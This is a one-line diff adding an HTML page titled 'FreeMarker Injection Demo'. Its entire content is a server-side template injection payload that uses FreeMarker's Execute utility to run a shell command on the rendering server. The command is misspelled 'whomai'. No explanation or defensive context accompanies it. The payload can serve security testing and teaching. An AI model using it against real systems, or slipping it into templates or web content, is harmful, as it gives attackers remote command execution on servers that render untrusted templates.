@@ -1,0 +1,1 @@
+<!DOCTYPE html><html><head><title>FreeMarker Injection Demo</title></head><body><#assign ex="freemarker.template.utility.Execute"?new()>${ ex("whomai") }</body></html>
